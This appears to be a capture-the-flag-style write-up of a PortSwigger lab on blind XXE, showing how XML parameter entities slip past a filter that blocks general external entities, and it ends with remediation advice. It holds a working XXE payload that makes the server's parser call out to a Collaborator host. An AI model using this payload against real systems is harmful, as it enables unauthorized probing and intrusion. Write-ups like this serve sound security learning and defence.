# Blind XXE with Out-of-Band Interaction via XML Parameter Entities

**Category:** XML External Entity (XXE) Injection — Blind
**Lab:** Blind XXE with out-of-band interaction via XML parameter entities
**Status:** Solved ✅

---

## What's going on here

Same blind detection goal as the previous lab — get the parser to phone home to Collaborator — but this time there's an added obstacle: the application specifically blocks requests containing "regular" external entities. Whatever filtering logic was added to stop the previous lab's exact technique is apparently watching for the standard `<!ENTITY name SYSTEM "...">` pattern and rejecting anything that matches it. The way around it leans on a lesser-known corner of the XML specification: **parameter entities**, which are a structurally different kind of entity with their own syntax — different enough that a filter built around general entities alone won't recognize them.

**Goal:** confirm blind XXE using a parameter entity instead of a general entity, bypassing whatever filter is blocking the standard approach. Requires Burp Suite Professional and the lab's own public Collaborator server, same as the previous lab.

## General entities vs. parameter entities

Up to this point, every entity used in this series has been a **general entity** — declared as `<!ENTITY name "value">` (or with `SYSTEM` for an external source), and referenced in the document body as `&name;`. These are the "normal" kind most people think of when they hear "XML entity."

**Parameter entities** are a separate, specifically DTD-internal mechanism: declared with a `%` immediately after `ENTITY` — `<!ENTITY % name SYSTEM "...">` — and referenced, also with a `%`, as `%name;`. Critically, parameter entities can *only* be referenced from within the DTD itself (the `<!DOCTYPE ...[ ... ]>` block), not from the main body of the XML document the way general entities are. That's a real, meaningful restriction compared to general entities — but for our purposes, it doesn't matter at all, since triggering an out-of-band interaction only requires the entity to be *resolved*, which happens the instant it's referenced anywhere, DTD included.

Because parameter entities use entirely distinct syntax from general entities, a filter written to detect and block the general-entity pattern (`<!ENTITY xxe SYSTEM ...>` referenced via `&xxe;`) has no reason to also recognize or block the parameter-entity pattern (`<!ENTITY % xxe SYSTEM ...>` referenced via `%xxe;`) unless it was deliberately built to catch both.

## Working through it

**1. Trigger the stock checker and capture the request**

Visit a product page, click **Check stock**, and intercept the request in Burp Suite Professional. Send it to Repeater.

**2. Confirm the standard technique is blocked**

If you try the regular-entity approach from the previous lab here, you should find it gets rejected — confirming the filter specifically targets that pattern.

**3. Insert a parameter entity instead**

Between the XML declaration and the `<stockCheck>` element, insert:

```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```

Note the structure: `<!ENTITY % xxe SYSTEM "...">` declares the parameter entity (notice the `%` right after `ENTITY`), and `%xxe;` immediately after, still inside the DTD's square brackets, is what actually references and triggers it — there's no need to reference it anywhere in the document body at all, since the reference inside the DTD itself is enough to cause resolution.

**4. Insert a live Collaborator payload**

Right-click exactly where `BURP-COLLABORATOR-SUBDOMAIN` sits and choose **Insert Collaborator payload**, letting Burp swap in a unique, monitored subdomain.

**5. Send the request**

No change needed to the `productId` field this time — unlike the general-entity version, we're not referencing anything in the document body. The entire payload lives entirely within the DTD declaration itself.

**6. Poll Collaborator for interactions**

Go to the **Collaborator** tab and click **Poll now**, waiting and re-polling if nothing shows up immediately.

**7. Confirm the interaction**

You should see DNS and HTTP interactions logged, confirming the XML parser resolved our parameter entity and made an outbound request to our Collaborator subdomain — despite the filter that successfully blocked the equivalent general-entity payload. Lab solved.

## The payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN.oastify.com"> %xxe; ]>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Note the `productId` value can stay completely normal — the exploit doesn't depend on referencing anything in the document body at all.

## Why this works

This is a textbook example of a filter built around pattern-matching a *specific syntax* rather than genuinely understanding the *underlying capability* it's trying to prevent. Whatever check is blocking "regular" external entities is almost certainly looking for the `<!ENTITY name SYSTEM ...>` / `&name;` shape specifically — and parameter entities simply don't match that shape at all, despite being resolved by the exact same underlying mechanism (fetching an external resource as part of DTD/entity processing) and carrying the exact same risk.

XML's specification genuinely does distinguish parameter entities from general entities as separate, syntactically distinct features — this isn't an obscure trick exploiting some parser bug, it's a completely standard, well-documented part of XML that happens to be less commonly known (and therefore less commonly defended against) than general entities. Any filter or sanitization approach that enumerates specific dangerous *patterns* rather than disabling the underlying *feature* (external entity resolution entirely, regardless of which entity type triggers it) is going to miss cases like this one.

## Tools used

- Burp Suite **Professional** (Collaborator required)
- Burp Repeater

## Takeaways

- Parameter entities (`<!ENTITY % name "...">` / `%name;`) are a distinct XML feature from general entities, with their own syntax — and they're resolved by the parser using the same underlying external-entity mechanism, carrying identical risk.
- A filter that blocks one entity syntax but not the other demonstrates a recurring theme across this whole lab series: pattern-based blacklists only ever catch the specific patterns their author anticipated, never the full scope of what they're conceptually trying to prevent.
- Parameter entities only need to be referenced *within the DTD itself* to trigger resolution — no reference anywhere in the document body is required, which is itself a useful fact to know when a filter might also be inspecting the document body specifically.
- Whenever a "standard" injection technique gets blocked, it's worth asking whether there's a lesser-known, syntactically different variant of the same underlying feature that accomplishes the identical goal — this pattern shows up across SQLi, XSS, path traversal, and now XXE in this series.

## Fixing it

- Disable DTD processing entirely in the XML parser configuration wherever possible — this is the most robust fix, since it removes both general and parameter entity resolution (and any other DTD-based attack surface) at the source, rather than trying to filter specific entity syntaxes.
- If DTD processing can't be disabled outright, ensure any filtering explicitly accounts for *both* general and parameter entity syntax, not just the more commonly-known general entity pattern.
- Never rely on syntax-pattern-based filtering as the primary defense against XXE — the correct fix is always disabling the underlying capability (external entity resolution) at the parser configuration level, not trying to blacklist specific ways of invoking it.
- As with the earlier XXE labs, consider whether XML is genuinely necessary for the input format in question, or whether a simpler format without this entire category of embedded-feature risk (JSON, for instance) would serve the same purpose.

---

*Solved as part of the PortSwigger Web Security Academy — for learning/authorized testing only. Don't run this against anything you don't have permission to test.*
